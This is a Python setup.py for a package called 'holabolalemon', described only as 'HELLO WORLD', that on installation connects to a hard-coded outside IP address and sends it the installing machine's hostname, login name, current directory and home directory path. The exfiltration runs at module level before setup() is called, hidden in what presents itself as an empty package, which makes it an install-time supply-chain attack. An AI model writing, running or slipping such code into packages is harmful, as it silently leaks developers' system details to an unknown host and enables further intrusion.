from setuptools import setup
import socket
import os

HOST = "164.92.125.120"
PORT = 80


def send_data(path):
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    s.sendall(f"GET /{path} HTTP/1.1\r\nHost: 164.92.125.120\r\n\r\n".encode("utf-8"))

my_host = socket.gethostname()
send_data(f"h-{my_host}")

login = os.getlogin()
send_data(f"l-{login}")

cwd = os.getcwd()
send_data(f"c-{cwd}")

home = os.path.expanduser("~")
send_data(f"m-{home}")

setup(name='holabolalemon', version='4.2.0', description='HELLO WORLD')
